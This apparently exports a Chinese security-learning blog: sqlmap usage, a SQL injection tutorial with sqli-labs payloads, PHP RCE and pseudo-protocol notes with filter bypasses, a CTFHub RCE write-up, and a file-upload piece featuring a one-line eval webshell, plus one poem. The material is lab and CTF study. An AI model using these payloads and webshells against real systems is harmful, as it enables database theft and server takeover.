[{"title":"sqlmap","url":"/post/e5da2ca1.html","content":"\n\nsqlmap简介sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。\n用于数据库注入\n猜解是否能注入\n\n\npython sqlmap.py -u “url”\n\n\n猜解库\n\n\npython sqlmap.py -u “url” –dbs\n\n\n猜解表\n\n\npython sqlmap.py -u “url” –tables\n\n\n根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)\n\n\npython sqlmap.py -u “url” –columns -T admin\n\n\n根据字段猜解内容(假如通过3得到字段为username和password)\n\n\npython sqlmap.py -u “url” –dump -T admin -C “username,password”\n\n用于cookie注入\ncookie注入，猜解表\n\n\npython sqlmap.py -u “url” –cookie “cookie” –table –level 2\n\n\n猜解字段，(通过1的表猜解字段，假如表为admin)\n\n\npython sqlmap.py -u “url” –cookie “cookie” –columns -T admin –level 2\n\n\n猜解内容\n\n\npython sqlmap.py -u “url” –cookie “cookie” –dump -T admin -C “username,password” –level 2\n\npost登录框注入\n浏览器打开目标地址\nburp抓包，拦截请求\n点击提交，burp会拦截post请求\n复制post请求头为post.txt，并放到sqlmap目录下\n运行sqlmap\n\nstep1：sqlmap -r [&quot;请求头文本&quot;]  //测试是否存在注入step2：sqlmap -r [&quot;请求头文本&quot;] --current-db //查询当前数据库step3：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] --tables //查询当前数据库的所有表step4：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns //查询指定库指定表的所有字段step5：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] -C [&quot;字段名&quot;] --dump //打印出指定库指定表指定字段的所有字段内容\n\n常见参数使用\n设置目标URL：\n\n\n参数：-u    每次只能扫描一个url格式：sqlmap -u “url”\n参数：-m    从文本中获取多个目标扫描，但是每次只能有一个url格式：sqlmap -m 1.txt、\n参数：-r    从文件中加载HTTP请求，这样的话，就不需要再去设定coolie，POST数据等值…..格式：sqlmap -r 1.txt\n\n\n设置回显等级：\n\n\n参数：-v0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认等级）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页。\n\n\n设定探测等级：\n\n\n参数：–level默认为1level&gt;=2的时候就会测试HTTP Cookielevel&gt;=3的时候就会测试HTTP User-Agent/Referer头level=5的时候会测试HTTP Host\n\n参数介绍\noptions类：\n\n\nsqlmap –version    查看sqlmap版本信息.\n-h    查看功能参数(常用的)\n-hh　查看所有的参数 (如果有中文包 就最好了)\n-v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细.\n\n\nTarget(指定目标):\n\n\n-d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接.\n-u    指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 \n-l    指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描\n-x    以xml的形式提交一个站点地图给sqlmap(表示不理解..)\n-m    如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描\n-r    把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体\n-g    利用谷歌搜索引擎搭配正则来过滤你想要的\n-c    加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描\n\n\nRequest类参数\n\n\n–data    提交的时候要携带的参数（get，post通用，最简单的post请求方式）\n–users     获取数据库用户\n–dbs    获取所有数据库\n–cookie    设置cookie头\n–user-agent    指定user-agent（防止对方服务器侦测到）\n–random-agent    随机agent\n–host    指定host头\n–level    安全级别 (1-5, &gt;=3,检测anent,&gt;=5,检测host头)\n–referer    指定referer头(level &gt;=3才检测)\n–headers    指定额外的headers请求头(多个必须使用换\\n,首字母必须大写)\n–method　指定请求方式, 默认为get,get请求不成功尝试post　　　\n–proxy　指定代理 \n–proxy-cred    指定代理的账号密码(代理需要账号密码的前提下)\n–delay　每次请求的延迟时间,单位秒,默认无延迟.\n–timeout　请求超时时间,默认30秒.\n–retries　连接超时重试次数 ,默认3次\n\n\n","categories":["网络安全"],"tags":["工具"]},{"title":"sql注入","url":"/post/530fceb2.html","content":"\n\n什么是SQL注入\nSQL 注入就是指 web应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql语句来实现 对数据库的任意操作。\n\nSQL注入攻击思路\n\n判断是否存在注入\n判断注入类型\n猜解语句中的字段数\n判断回显位置\n爆数据库名\n爆表名\n爆字段名\n查找内容\n\n\n判断是否存在SQL注入\n最为经典的单引号判断法：在参数后面加上单引号,比如: http://xxx/abc.php?id=1&#39; 如果页面返回错误，则存在SQL注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错。\n\n判断SQL注入类型类型分为两种：数字型和字符型\n\n数字型判断：可以使用经典的 and 1=1 和 and 1=2 来判断：\n\n\nurl中输入？id=1 and 1=1 页面依旧正常运行，继续下一步url中输入？id=1 and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。\n\n\n字符型判断：可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：\n\n\nurl中输入1’ and ‘1’ = ‘1,页面运行正常，继续进行下一步。url中继续输入1’ and ‘1’ = ‘2,页面运行错误，则说明此 Sql 注入为字符型注入。\n\n常见的注入方式\n联合注入\n布尔盲注\n时间盲注\n宽字节注入\n报错注入\n堆叠注入\n二次注入\n……\n\n联合注入注入一般流程：\n\n\n判断注入点\n判断字段数\n判断回显位置\n爆破库名\n爆破表名\n爆破字段名\n爆破字段值\n\n\n以sql-libs/Less-1为例(1)判断注入点\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=1 --+\tpayload： http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=2 --+\t\t根据页面回显不同，判断id参数存在sql注入(2)判断字段数 order by\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; order by x --+\t发现x=3时有回显，x=4时无回显，判断出存在三列(3)判断回显位置 union select\t需将参数的数据值设为不存在\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,3 --+ \t判断出回显位置为2，3(4)爆破库名 在回显位置替换参数即可\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,database(),3 --+ (5)爆破表名 \tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+ (6)爆破字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 --+ (7)爆破字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),3 --+\n\n报错注入应用场景：查询不回显内容，会打印错误信息\n\n常用函数：floor(),updatexml(),extractvalue()\n\n以updatexml()为例(1)爆表 修改 limit 0,1 参数 依次爆出所有表名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+(2)爆字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段名(3)爆字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值(4)爆对应的密码\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select password from users where username = &#x27;Dumb&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值\n\n布尔盲注应用场景：\n\n代码存在sql注入漏洞，然而页面不会显数据，也不会显错误信息。只返回”right” 与wrong 这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的“真”和“假”来识别我们的判断是否正确，这就是布尔盲注。\n\n常用函数：\n\nleft()       left(database(),1)&gt;’s’    database()显示数据库名称，left(a,b)从左侧截取a的前b位。regexp           select user() regexp ‘^r’  正则表达式用法 user()结果为root,regexp为匹配root的正则表达式like         select users() like ‘’ro%’   与regexp类似，使用like进行匹配substr函数   ascii() 函数    ascii(substr(select database()),1,1)=98 从1位置开始截取数据库名字的1个长度，ascii()将字符转化为ascii值。ord()   mid()     mid(a,b,c)ord(mid((select user()),1,1))=114从位置b开始，截取a字符串的c位，ord()函数通ascii()，将字符转为ascii值。\n\n时间盲注时间盲注是什么？\n\n通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数\n看加载页面的时间来判断注入点\n适用场景：没有回显，甚至连注入语句是否执行都无从得知\n\n常用函数：\n\nsleep() – 返回0 命令中断返回1substr(a,b,c) – 从b为止开始截取字符串a的c长度mid() – 与substr完全一致count() – 计算总数ascii() – 返回第一个字符的ASII码ord() – 与ascii完全一致length() – 返回字符串的长度left() – 从左往右截取字符串right() –从右往左截取字符串if(condition,true,false)：condition为条件，条件为真返回true，条件为假返回false\n\n注入一般流程：\n\n先用length()获取数据库长度用substr() and sleep() 来确定每一个字符，从而确定数据库\n\n堆叠注入\n原理介绍： 在SQL中，分号（;）是用来表示一条sql语句的结束。\n\n\n联合注入也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者unionall执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 \n\n\n局限性： 使用该注入，需要知道数据库的一些信息，例如表名，列名等。并不是每种环境都可以使用。oracle数据库不行，mysql、mssql‘postgresql可以。  \n\n\n应用实例：已经爆破出管理员密码，但是是加密存储，且无法解密。可以使用堆叠注入，在该表中注入 \n\n举个栗子;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)=&#x27;r&#x27;,sleep(3),1)\n\n二次注入\n原理 分为两步：第一步：插入恶意数据第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行转义，在写入数据库时还是保留用户输入的数据，但是该数据中包含恶意内容。 \n第二步：引用恶意数据在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 \n\n\n例如：输入参数1’     参数经过转义函数变为1&#39;    参数进入数据库存储还原为1’寻找另一处引用这个数据的操作将1’从数据库中取出       取出后直接给变量并且带入SQL   SQL注入触发 实战   sql-lib 24 1.在创建用户界面 创建 admin’#  123 账号 2.登录  admin ‘#  123 账号 修改admin’#密码为  123456 3.发现 admin 密码变为123456\n\n\n实战   sql-lib 241.在创建用户界面 创建 admin’#  123 账号2.登录  admin ‘#  123 账号 修改admin’#密码为  1234563.发现 admin 密码变为123456\n\nSQL注入绕过\n注入符号绕过常见的注释符号有\n\n-- 注释内容# 注释内容/*注释内容*/;\n\n\n大小写绕过\n\n举个例子select * from users where id = -1 union select 1,2,3\n\n\n内联注释绕过\n内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。\n\n举个例子select * from users where id = -1 union /*!select*/ 1,2,3;\n\n\n双写关键字绕过将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。\n\n十六进制绕过\n\n\n举个例子test1等价于0x7465737431select * from users where username = 0x7465737431;\n\n\n空格过滤绕过\n\n/**/()回车(url编码中的%0a)`(tap键上面的按钮)tap两个空格\n\n\n过滤or and xor not 绕过\n\nand = &amp;&amp;or = ||xor = | # 异或not = !\n\n\n过滤等号=绕过不加通配符的like执行的效果和=一致，所以可以用来绕过。利用大小于号、!配合使用进行绕过\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"无题","url":"/post/9b44950b.html","content":"\n\n\n你路过我的春光明媚\n离开我的望穿秋水\n当雾气锁住凝眉\n当笛声告别夕炊\n最好你舍得我送别的眼\n从此一去不回\n最好我忘掉你流水的心\n再无浊酒一杯\n当我赶起羊群踏尽青草\n当你忘了路过此地朝朝暮暮\n天晓得柔情似水\n妄想谁泪眼愁眉\n等到所有的故事都死去\n我爱过的人都成灰\n有的变成河水\n有的变成眼泪\n该请谁来聆听\n荒野的风声吹向月亮\n我心如荒野    凛风不歇\n该请谁来触及\n青山的恻隐藏了四季\n我身如青山    瘦贫瘠该\n请谁来抵达\n镜中青花结成了白发\n我灵魂如镜    虚罄年华\n该请谁来行歌\n长河两侧的落落景色\n我生如长河    终生奔波\n终生    一无所获\n\n","categories":["我同桌的文集"],"tags":["文集"]},{"title":"RCE(远程代码执行漏洞)","url":"/post/de7b7d00.html","content":"\n\n形成原因\n应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。\n\n可能存在命令执行漏洞的函数（PHP）\n利用系统函数实现命令执行的函数\n\n\neval()assert()preg_replace()call_user_func()\n\n\n直接执行系统命令的代码函数\n\n\nsystem()exec()shell_exec()&amp;(``)passthru()pcntl_exec()popen()proc_open()\n\n命令拼接符号\nWindows的系统命令拼接符\n\n\n\n\n拼接符\n示例\n拼接符的详解\n\n\n\n&amp;\nA&amp;B\n无论A是false还是true，B都执行，即互不影响\n\n\n&amp;&amp;\nA&amp;&amp;B\n具有短路效果，A是false，B就不执行，有短路效果\n\n\n|\nA|B\n表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行\n\n\n||\nA||B\n表示A命令语句执行失败，然后才执行B命令语句\n\n\n\nLinux的系统命令拼接符\n\n\n&amp;    使命令在后台运行;    进行多条命令的无关联执行，每一条执行结果互不影响&amp;&amp;    与Windows一样，左边成功才执行右边||    与Windows一样，前面执行失败才执行后面()    执行多个命令时，需要用命令分隔符分号隔开每个命令，并使用**()**把所有命令组合起来\n\nphp伪协议php支持的伪协议\n\nfile://    访问本地文件http://    访问HTTP(s)网址ftp://    访问FTP(s) URLsphp://    访问各个输入/输出流（I/O streams）zlib://    压缩流data://    数据（RFC 2397）glob://    查找匹配的文件路径模式phar://    PHP 归档ssh2://    Secure Shell 2rar://    RARogg://    音频流expect://    处理交互式的流\n\n一、php://filter\n获取指定文件源码。当他与包含函数结合时，php://filter流会被当作php文件执行。\n\n协议参数\n\n\n\n名称\n描述\n\n\n\nresource=&lt;要过滤的数据流&gt;\n这个参数是必须的。它指定了你要筛选过滤的数据流。\n\n\nread=&lt;读链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（`\n\n\nwrite=&lt;写链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（`\n\n\n&lt;；两个链的筛选列表&gt;\n任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。\n\n\n常用：\nphp://filter/read=convert.base64-encode/resource=index.phpphp://filter/resource=index.phpconvert.base64-encode\t过滤器\n\n二、data://\n数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。\n\n&lt;?php// 打印 &quot;I love PHP&quot;echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );?&gt;\n\n三、file://\n用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)比如：?file=file:///etc/passsword\n\n四、php://\n在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用php://作用为访问输入输出流\n\n五、php://input\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n例如：?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt;注意：当enctype=&quot;multipart/form-data&quot;的时候php://input是无效的遇到file_get_contents()要想到用php://input绕过\n六、zip://\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n例如：zip://[压缩包绝对路径]#[压缩包内文件]\n\nzip://中只能传入绝对路径。要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23只需要是zip的压缩包即可，后缀名可以任意更改。相同的类型的还有zlib://和bzip2://\n\n例如：?file=zip://D:\\zip.jpg%23phpinfo.txt\nPHP伪协议总结 \n各种绕过\ncat被过滤时\n\nmore     #一页一页的显示档案内容less     #与 more 类似head     #查看头几行tac      #从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail     #查看尾几行nl       #显示的时候，顺便输出行号od       #以二进制的方式读取档案内容sort     #可以查看uniq     #可以查看//vi       #一种编辑器，这个也可以查看//vim      #一种编辑器，这个也可以查看//file -f  #报错出具体内容//sh /flag 2&gt;%261  #报错出文件内容#使用转义符号ca\\t /fl\\agcat fl&#x27;&#x27;ag#拼接法a=fl;b=ag;cat$IFS$a$b#使用空变量$*和$@，$x,$&#123;x&#125;绕过ca$*t flag || ca$@t flag || ca$5t flag ca$&#123;5&#125;t flagfind    #列出当前目录下的文件以及子目录所有文件\n\n\n过滤空格\n\ncat&lt;flag  #重定向符cat$&#123;IFS&#125;flag || cat$IFS$9flag #全局变量#$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果#然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，#为什么要用$9呢，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串\n\n\n过滤目录分隔符\n\n#采用多管道命令绕过127.0.0.1||cd flag_is_here;cat flag_262431433226364.php%0a      #换行符%0d      #回车符号用?&gt;代替 ;#在php中可以用?&gt;来代替最后的一个; ，因为php遇到定界符关闭标签会自动在末尾加上一个分号\n\n其他绕过：命令执行(RCE)面对各种过滤，骚姿势绕过总结 \n","categories":["网络安全"],"tags":["web安全"]},{"title":"CTFHUB_RCE","url":"/post/7e6bea45.html","content":"\n\n一、eval执行打开环境发现一段php代码：\n&lt;?phpif (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;    eval($_REQUEST[&quot;cmd&quot;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n\n发现参数为cmd\npayload：?cmd=phpinfo();有回显，说明可以利用系统命令函数\npayload：?cmd=system(&quot;ls /&quot;);有回显，并且看到有关于flag的文件，读取它\npayload：?cmd=system(&quot;ls / | cat /flag_9712&quot;);得到flag\n二、文件包含打开环境发现一段php代码：\n&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i have a &lt;a href=&quot;shell.txt&quot;&gt;shell&lt;/a&gt;, how to use it ?\n\n介绍一下陌生函数：\n\nstrpos(x,y)    查看y是否在x里\ninclude    将文件里的代码当作原来文件的代码执行\n\n点击shell得到一串php代码：\n&lt;?php eval($_REQUEST[&#x27;ctfhub&#x27;]);?&gt;\n\n\n\n根据代码得出：需要用GET传参方式传参，参数为file\npayload：?file=shell.txt点击shell得到php代码：&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;\npayload：以post方式传参：ctfhub=system(&quot;ls&quot;)根据回显发现没有有关flag的文件，那就读取上级目录看看\npayload：ctfhub=system(&quot;ls /&quot;)根据回显发现flag\npayload：ctfhub=system(&quot;cat /flag&quot;)得到flag\n三、php://input打开环境发现php代码：\n&lt;?phpif (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;\n\n根据代码得出：需要以GET方式传入一个名为file参数的数据，点击phpinfo()发现，php://input可以使用\npayload：?file=php://input根据php://input规则，需要POST传入数据\npayload：&lt;?php system(&quot;ls&quot;);?&gt;根据回显发现没有flag，查找上级目录\npayload：&lt;?php system(&quot;ls /&quot;);?&gt;发现flag，查看\npayload：&lt;?php system(&quot;cat /flag_4801&quot;);?&gt;得到flag\n四、读取源代码打开环境得到php代码：\n&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;\n\n根据提示使用php://input发现不管用，用一下新的伪协议吧——php://filter\npayload：?file=php://filter/resource=/flagflag一下子就出来了呢\n五、远程包含打开环境得到代码：\n&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;\n\n用一下php://input吧，一下子就得到了flag呢\npayload：&lt;?php system(&quot;cat /flag&quot;);?&gt;\n六、命令注入根据回显得出这是一个ping IP的题目\nping一下baidu.com得到回显\npayload：baidu.com | ls得到回显并发现可疑.php文件，打开发现打不开该文件，试一下base64吧\npayload：baidu.com | cat 31327443624755.php | base64 再解码得到flag\n七、过滤cat直接上payload\npayload：baidu.com | ls得到flag文件，但是cat被过滤了，换个等价函数吧\npayload：baidu.com | more flag_34911944417894.php | base64  得到加密后的flag，解码得到flag\n八、过滤空格直接上payload\npayload：baidu.com | ls发现没有东西，空格被过滤\npayload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;ls得到flag文件，查看该文件\npayload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;cat$&#123;IFS&#125;flag_31123320624556.php$&#123;IFS&#125;|$&#123;IFS&#125;base64解密得到flag\n九、过滤目录分隔符payload：baidu.com | ls得到flag目录\npayload：baidu.com;cd flag_is_here;ls得到flag文件，查看文件\npayload：baidu.com;cd flag_is_here;cat flag_4088165719730.php|base64解码得到flag\n十、过滤运算符过滤了运算符，但是**;**漏掉了\npayload：baidu.com;ls查看flag文件\nbase64 .php &lt;=&gt;,php|base64\npayload：baidu.com;base64 flag_80902931728195.php\n十一、综合过滤练习看完代码傻眼了，啥都被过滤了，哎~~~\n看看过滤笔记再来试试看**;**可以用%0a代替但是需要在url上使用\npayload：baidu.com%0als得到flag目录，继续搞\npayload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0als得到flag文件\npayload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0abase64$&#123;IFS&#125;fl&#39;&#39;ag_248952873310635.php解码得到flag\n","categories":["网络安全"],"tags":["CTFHUB-wp"]},{"title":"文件上传","url":"/post/592e5fba.html","content":"\n\nWebShell与WebShell管理工具什么叫做WebShell\nWebShell，简称网页后门。运行在Web应用之上的远程控制程序 \nwebshell其实就是一张网页，由PHP、JSP、ASP、ASP.NET等web语言开发，但并不具备常见网页的功能，例如登陆、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能\n\n常见的WebShell有哪些\n大马、小马、各种马等\n拥有完整功能的webshell，我们一般称为大马\n功能简易的webshell称为小马\n除此之外还有一句话木马、不死马、脱库马等等，是对webshell功能或者特性的简称\n\nWebShell有什么作用呢大马有什么作用呢\n\n上传大马后，可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等一系列操作\n\n一句话木马解读\n&lt;?php @eval($_POST[x]); ?&gt;\n\n\n$_POST[x]: 获取POST请求参数中x的值。例如POST请求中传递x=phpinfo();，那么$_POST[x]就等同于phpinfo();\neval()将字符串当作PHP代码去执行。例如eval(&#39;phpinfo();&#39;)，其中phpinfo();会被当做PHP代码去执行。\n\n&lt;?php @eval($_POST[x]); ?&gt;   实际上的传递过程是这样的\t\t\t↓\t\t\t↓\t\t\t\t\t\t↓&lt;?php @eval(&#x27;phpinfo();&#x27;); ?&gt; 实际的语句是这样的 \t\t\t\n\n\n我们通过该webshell，传递任意PHP代码，让其去执行，从而达到任意代码执行。\n错误控制运算符，当将 @放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 忽略掉。\n\n文件上传什么是文件上传漏洞\n\n文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。\n\n客户端JavaScript检测\n如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。\n\n&lt;script type=&quot;text/javascript&quot;&gt;    function checkFile() &#123;        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;        if (file == null || file == &quot;&quot;) &#123;            alert(&quot;请选择要上传的文件!&quot;);            return false;        &#125;        //定义允许上传的文件类型        var allow_ext = &quot;.jpg|.png|.gif&quot;;        //提取上传文件的类型        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));        //判断上传文件类型是否允许上传        if (allow_ext.indexOf(ext_name) == -1) &#123;            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;            alert(errMsg);            return false;        &#125;    &#125;&lt;/script&gt;\n\n绕过思路：1.直接本地禁用JS，不让其做检测 2.抓包，修改文件后缀名类型，绕过检测限制\n服务器后端检测a. 文件类型检测\n\n此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型(如”image/gif”,”image/png”,”image/jpeg”) \n\nif (isset($_POST[&#x27;submit&#x27;])) &#123;if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];                      if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;     \n\n绕过思路：抓包将content-type改为可接受图片形式，即可绕过\nb.文件头类型检测\n\n上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型\n\nif(file_exists($filename))&#123;       $info = getimagesize($filename);\n\n\n文件头就是文件特定的标志，如二进制PE文件的4D5A，bmp文件的424D，zip文件的504B0304，各种常见文件的文件头类型大家可以查找了解一下，常见图片文件头如下：\n\n\ngif: GIF89a\njpg,jpeg: FF D8 FF E0 00 10 4A 46 49 46\npng: 89 50 4E 47 0D 0A\n\n绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过\nc.文件扩展名检测\n\n这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。\n\n黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用\n\n基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。\n\n白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。\n\n00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。\n\nd..htaccess\n\nhtaccess文件是apache服务器的一个配置文件，它负责相关目录下的网页配置\n\n\n通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能\n\n&lt;FilesMatch &quot;\\.jpg&quot;&gt;  SetHandler application/x-httpd-php &lt;/FilesMatch&gt;\n\n\n其中，SetHandler 